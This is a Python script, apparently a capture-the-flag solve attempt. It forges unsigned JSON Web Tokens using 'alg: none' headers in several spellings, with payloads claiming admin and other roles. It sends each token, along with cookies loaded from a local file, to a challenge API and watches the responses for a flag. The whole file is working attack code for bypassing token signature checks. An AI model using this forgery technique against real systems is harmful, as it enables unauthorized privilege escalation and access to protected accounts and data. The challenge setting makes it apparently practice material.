import requests
import http.cookiejar
import base64
import json

session = requests.Session()
cj = http.cookiejar.MozillaCookieJar("/Users/ricksabchez/workspace/ramzolmasal_cookies.txt")
cj.load(ignore_discard=True, ignore_expires=True)
session.cookies = cj

def b64url(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode('utf-8')
    elif isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

# Try different alg: none variations
headers_variants = [
    {"alg": "none", "typ": "JWT"},
    {"alg": "None", "typ": "JWT"},
    {"alg": "NONE", "typ": "JWT"},
]

payloads_variants = [
    {"role": "admin"},
    {"role": "witness"},
    {"role": "shahed"},
    {"role": "fox"},
    {"role": "admin", "id": "88004c9a"},
    {"role": "admin", "nickname": "m4tinbeigi"},
    {"admin": True},
    {"is_admin": True}
]

for h in headers_variants:
    for p in payloads_variants:
        token = f"{b64url(h)}.{b64url(p)}."
        url = f"https://256.yektanet.tech/ramzolmasal/api/status?level=shahed&token={token}"
        r = session.get(url)
        data = r.json()
        print(f"\nToken ({h['alg']}, {p}):")
        print("Status Code:", r.status_code)
        print("Response:", data)
        if "flag" in str(data) or data.get('charm') or "YEK{" in str(data):
            # Check if charm changed or flag revealed
            print(">>> CHECK DATA:", data)
